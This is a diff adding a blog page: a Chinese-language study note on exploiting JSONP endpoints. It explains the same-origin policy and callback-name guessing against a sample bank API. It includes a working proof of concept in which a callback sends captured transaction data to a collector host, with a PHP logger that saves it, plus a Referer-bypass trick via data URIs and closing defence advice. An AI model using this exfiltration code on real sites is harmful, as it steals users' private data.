@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献:https://segmentfault.com/a/1190000009577990              http://www.codesec.net/view/172245.html             http://www.freebuf.com/articles/web/126347.html https://www.jianshu.com:80/writerhttps">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cws6">
+<meta property="og:url" content="https://cws6.github.io/user-5035860-1543717448/漏洞学习/JSONP利用.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献:https://segmentfault.com/a/1190000009577990              http://www.codesec.net/view/172245.html             http://www.freebuf.com/articles/web/126347.html https://www.jianshu.com:80/writerhttps">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-02T02:24:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cws6">
+<meta name="twitter:description" content="参考文献:https://segmentfault.com/a/1190000009577990              http://www.codesec.net/view/172245.html             http://www.freebuf.com/articles/web/126347.html https://www.jianshu.com:80/writerhttps">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/user-5035860-1543717448/漏洞学习/JSONP利用.html">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title> | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/JSONP利用.html/">JSONP利用.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>参考文献:<a href="https://segmentfault.com/a/1190000009577990" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009577990</a><br>              <a href="http://www.codesec.net/view/172245.html" target="_blank" rel="noopener">http://www.codesec.net/view/172245.html</a><br>             <a href="http://www.freebuf.com/articles/web/126347.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/126347.html</a></p>
+<p><a href="https://www.jianshu.com:80/writer" target="_blank" rel="noopener">https://www.jianshu.com:80/writer</a><br>https:协议;   www:子域名;  jianshu主域名;  80:端口号;<br>跨域:用户对不同协议或不同域名或不同端口号的资源进行访问</p>
+<p>同源策略规定：XHR对象(ajax功能实现所依赖的对象)只能访问与包含它的页面位于同一域中的资源，有利于预防一些恶意行为。<br>同源：即同一域，即相同协议&amp;相同端口&amp;相同域名&amp;相同子域名<br>XHR对象:XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括 POST ,HEAD,GET。XHR 可以同步或异步地返回 Web 服务器的响应，并且能够以文本或者一个 DOM 文档的形式返回内容。XHR接口强制要求每个请求都具备严格的HTTP语义–应用提供数据和URL，浏览器格式化请求并管理每个连接的完整生命周期，所以XHR仅仅允许应用自定义一些HTTP首部，但更多的首部是不能自己设定的</p>
+<p>在HTML语言中，不受同源策略的限制的标签：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">&lt;img&gt;</span><br><span class="line">&lt;iframe&gt;</span><br><span class="line">&lt;link&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>JSONP解决跨域问题：</strong><br>JSONP不能访问非本域的动态资源，但是类似js文件、样式、图片等静态资源是可以访问的,通过这个”漏洞”来解决跨域问题。用<em><script></em>标签中的src来写入跨域数据的url，这样就能绕过同源策略了。<br>JSONP常用于服务器与客户端跨源通信，JSONP只支持GET请求，不支持POST请求,JSONP基本语法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123; &quot;name&quot;: &quot;kwan&quot; , &quot;msg&quot;: &quot;获取成功&quot; &#125;);</span><br></pre></td></tr></table></figure></p>
+<p>JSONP两部分组成：<code>回调函数和里面的数据</code>。回调函数是当响应到来时，应该在页面中调用的函数，一般是在发送过去的请求中指定。<br>JSONP原理：动态插入带有跨域url的<script>标签，然后调用回调函数，把我们需要的json数据作为参数传入，通过一些逻辑把数据显示在页面上。</p>
+<p><strong>利用场景</strong><br>①在响应中回调函数被硬编码</p>
+<ul>
+<li>基础函数调用</li>
+<li>对象方法调用<br>②动态调用回调函数</li>
+<li>URL完全可控（GET变量）：回调函数在URL中指定，我们可以完全控制它。</li>
+<li>URL部分可控（GET变量），但是附加有一个数字，每个会话都不同</li>
+<li>URL可控，但最初不会显示在请求之中</li>
+</ul>
+<p><em>最后一个场景涉及一个没有回调的API调用，因此没有可见的JSONP。 这可能发生在开发人员，为其他软件或代码留下隐藏的向后兼容性只是没有在重构时删除。 因此，当看到没有回调的API调用时，特别是如果JSON格式的数据已经在括号之间，手动添加回调到请求。</em></p>
+<p>如果有以下API调用verysecurebank.ro/getAccountTransactions，我们可以尝试去猜猜回调函数的变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">verysecurebank.ro/getAccountTransactions?callback=test</span><br><span class="line">verysecurebank.ro/getAccountTransactions?cb=test</span><br></pre></td></tr></table></figure></p>
+<p>其他的常见的函数回调名还有<code>func、function、call、jsonp、jsonpcallback，jcb</code></p>
+<p><strong>基础数据抓取</strong><br>将数据抓取回我们本地。以下为一个简单的JSONP数据抓取:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function test(data)&#123;</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    var url = &quot;http://127.0.0.1/1.php?data=&quot; + JSON.stringify(data);//data是一个对象，所以用JSON.stringify</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,url,true);</span><br><span class="line">    xmlhttp.send();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://verysecurebank.ro/getAccountTransactions?callback=test&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>1.php内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=$_GET[&apos;data&apos;];</span><br><span class="line">$f=fopen(&apos;data.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($f,$data);</span><br><span class="line">fclose($f);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如果在响应头API请求头配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-type: application/json;charset=utf-8</span><br><span class="line">X-Content-Type-Options:nosniff;</span><br></pre></td></tr></table></figure></p>
+<p>Console输出如下：<br><img src="https://upload-images.jianshu.io/upload_images/5035860-df038f2bd896d46c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
+<p>在响应中API请求头<code>X-Content-Type-Options</code>被设置为<code>nosniff</code>，<code>Content-Type</code>必须设置为<code>JavaScript(text/javascript, application/javascript, text/ecmascript</code>等.)才能在所有浏览器中运行.</p>
+<p><strong>Referer检测绕过</strong><br><em>使用data URI方案</em><br>如果这里有一个Referer检测，为了绕过检测我们可以选择不发送。可以引用Data URI。<br>构造一个不带HTTP Referer的请求，可以滥用<code>data URI</code>方案。因为我们正在处理的代码包含了引号，双引号，以及其他一些被阻止的语句，接着使用base64编码我们的payload（回调函数定义以及脚本包含）<br><strong>data:text/plain;base64</strong>our_base64_encoded_code</p>
+<p><strong>防止jsonp hacking</strong><br>最直接最有效的方法便是CORS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">完全移除JSONP函数</span><br><span class="line">向API响应添加Access-Control-Allow-Origin header</span><br><span class="line">使用跨域AJAX请求</span><br><span class="line">添加Token</span><br></pre></td></tr></table></figure></p>
+</script></em></p>
+        
+      </div>
+      
+      
+      
+    </div>
+    
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>漏洞学习</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/JSONP利用.html/">JSONP利用.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
